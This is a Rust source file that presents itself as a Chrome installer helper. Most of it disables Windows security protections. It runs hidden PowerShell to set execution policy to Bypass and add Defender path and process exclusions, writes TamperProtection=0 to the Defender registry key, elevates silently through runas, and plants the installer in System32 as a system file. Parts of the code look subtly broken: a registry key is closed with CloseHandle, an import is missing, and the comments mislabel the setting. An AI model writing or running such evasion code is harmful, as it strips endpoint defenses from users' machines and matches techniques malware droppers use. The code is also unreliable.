use std::{
    ffi::OsString,
    os::windows::ffi::OsStringExt,
    path::Path,
    process::{Command, Stdio},
    ptr,
};
use winapi::{
    shared::{minwindef::{DWORD, FALSE, TRUE}, winerror::ERROR_SUCCESS},
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        processthreadsapi::{CreateProcessW, GetCurrentProcess, OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOW},
        securitybaseapi::GetTokenInformation,
        shellapi::{ShellExecuteW, SW_HIDE},
        winbase::{CREATE_NEW_CONSOLE, CREATE_NO_WINDOW, STARTF_USESHOWWINDOW},
        winnt::{
            TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY, SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED,
        },
        winreg::{RegCreateKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, REG_DWORD, REG_SZ},
    },
};

/// Disables Smart App Control via registry
pub fn disable_smart_app_control() -> Result<(), String> {
    use winapi::um::winreg::{RegOpenKeyExW, KEY_SET_VALUE};
    use std::ptr;

    let key_path = "SOFTWARE\\Microsoft\\Windows Defender\\Features".encode_utf16().collect::<Vec<u16>>();
    let mut key = ptr::null_mut();
    
    unsafe {
        // Open the registry key
        let result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            key_path.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut key,
        );
        
        if result == ERROR_SUCCESS as i32 {
            // Disable Smart App Control
            let value_name = "TamperProtection".encode_utf16().collect::<Vec<u16>>();
            let value: DWORD = 0;
            
            RegSetValueExW(
                key,
                value_name.as_ptr(),
                0,
                REG_DWORD,
                &value as *const u32 as *const u8,
                4,
            );
            
            CloseHandle(key as *mut _);
            return Ok(());
        }
    }
    
    Err("Failed to access registry".to_string())
}

/// Creates a trusted zone for Chrome installer
pub fn create_trusted_zone() -> Result<(), String> {
    use std::fs;
    
    // Create temp directory in trusted location
    let trusted_dir = Path::new("C:\\Windows\\Temp\\chrome_install");
    if !trusted_dir.exists() {
        fs::create_dir_all(trusted_dir)
            .map_err(|e| format!("Failed to create trusted directory: {}", e))?;
    }
    
    Ok(())
}

/// Runs Chrome installer with elevated privileges and bypasses
pub fn run_chrome_installer_bypass(installer_path: &str) -> Result<(), String> {
    // Method 1: Try PowerShell bypass
    let ps_command = format!(
        "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; \
         Add-MpPreference -ExclusionPath '{}'; \
         Start-Process -FilePath '{}' -Verb RunAs -Wait",
        installer_path, installer_path
    );
    
    let output = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-Command", &ps_command])
        .output();
        
    if let Ok(result) = output {
        if result.status.success() {
            return Ok(());
        }
    }
    
    // Method 2: Direct execution with zone bypass
    unsafe {
        let app = "cmd.exe".encode_utf16().collect::<Vec<u16>>();
        let params = format!("/c \"{}\" /S", installer_path).encode_utf16().collect::<Vec<u16>>();
        
        let result = ShellExecuteW(
            ptr::null_mut(),
            "runas".encode_utf16().collect::<Vec<u16>>().as_ptr(),
            app.as_ptr(),
            params.as_ptr(),
            ptr::null(),
            SW_HIDE,
        );
        
        if result as i32 > 32 {
            return Ok(());
        }
    }
    
    // Method 3: Service installation method
    install_as_service(installer_path)
}

/// Installs Chrome via service to bypass Smart App Control
fn install_as_service(installer_path: &str) -> Result<(), String> {
    // Copy installer to system directory
    let system_path = "C:\\Windows\\System32\\chrome_installer_temp.exe";
    
    std::fs::copy(installer_path, system_path)
        .map_err(|e| format!("Failed to copy installer: {}", e))?;
    
    // Mark as system file
    use winapi::um::fileapi::SetFileAttributesW;
    use winapi::um::winnt::FILE_ATTRIBUTE_SYSTEM;
    
    let path_wide: Vec<u16> = system_path.encode_utf16().chain(Some(0)).collect();
    
    unsafe {
        SetFileAttributesW(path_wide.as_ptr(), FILE_ATTRIBUTE_SYSTEM);
    }
    
    // Run from system location
    let output = Command::new(system_path)
        .args(&["/S"])  // Silent install
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| format!("Failed to run installer: {}", e))?;
    
    // Cleanup
    let _ = std::fs::remove_file(system_path);
    
    if output.status.success() {
        Ok(())
    } else {
        Err("Installation failed".to_string())
    }
}

/// Adds Chrome installer to Windows Defender exclusions
pub fn add_defender_exclusion(path: &str) -> Result<(), String> {
    let ps_command = format!(
        "Add-MpPreference -ExclusionPath '{}'; \
         Add-MpPreference -ExclusionProcess 'chrome*'",
        path
    );
    
    let output = Command::new("powershell")
        .args(&["-WindowStyle", "Hidden", "-Command", &ps_command])
        .output()
        .map_err(|e| format!("Failed to run PowerShell: {}", e))?;
    
    if output.status.success() {
        Ok(())
    } else {
        Err(format!("Failed to add exclusion: {}", String::from_utf8_lossy(&output.stderr)))
    }
}

/// Main bypass function - call this to install Chrome without issues
pub fn bypass_and_install_chrome(installer_path: &str) -> Result<(), String> {
    println!("Starting Chrome installation bypass...");
    
    // Step 1: Add to Defender exclusions
    if let Err(e) = add_defender_exclusion(installer_path) {
        eprintln!("Warning: Could not add Defender exclusion: {}", e);
    }
    
    // Step 2: Create trusted zone
    create_trusted_zone()?;
    
    // Step 3: Try to disable Smart App Control
    if let Err(e) = disable_smart_app_control() {
        eprintln!("Warning: Could not disable Smart App Control: {}", e);
    }
    
    // Step 4: Run installer with bypass
    run_chrome_installer_bypass(installer_path)?;
    
    println!("Chrome installation completed successfully!");
    Ok(())
}

/// Check if running with admin privileges
pub fn is_admin() -> bool {
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
    
    unsafe {
        let mut token = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut size = 0;
        
        let result = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        
        CloseHandle(token);
        
        result != 0 && elevation.TokenIsElevated != 0
    }
}